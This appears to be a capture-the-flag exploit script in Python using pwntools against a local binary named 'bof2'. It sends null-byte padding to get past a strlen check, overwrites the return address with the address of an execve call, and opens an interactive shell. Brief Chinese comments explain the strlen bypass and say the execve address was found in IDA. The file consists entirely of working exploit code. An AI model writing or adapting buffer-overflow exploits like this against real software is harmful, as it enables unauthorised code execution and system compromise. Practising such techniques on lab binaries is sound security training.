# -*- coding: UTF-8 -*-
from pwn import*
p=process('./bof2')
p.recv()
ret2excv=0x04006AC 
payload='\x00' * 0x18+p64(ret2excv)
p.sendline(payload)
p.interactive()

    #strlen用\x00绕过
    #绕过allow可以直接到IDA找execve地址
